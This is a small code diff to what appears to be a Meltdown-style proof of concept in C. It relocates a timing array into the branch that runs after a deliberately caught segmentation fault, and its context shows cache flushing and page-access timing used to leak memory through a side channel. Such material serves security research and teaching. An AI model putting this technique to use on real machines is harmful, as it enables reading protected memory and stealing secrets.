@@ -58,7 +58,6 @@ inline void clflush(const char *address)
         :            );
 }
 
-static unsigned long ticks[256];
 static jmp_buf jbuf;
 
 static void sigsegv_handler(int signo)
@@ -100,6 +99,8 @@ void main()
 
             printf("you should never see this line because of SIGSEGV above\n");
         } else { // else branch is executed on SIGSEGV
+            static unsigned long ticks[256];
+
             // measure access ticks of each page in buffer
             for (int i = 0; i < 256; i++) {
                 ticks[i] = get_access_ticks(&meltdown_buf[PAGE_SIZE * i]);
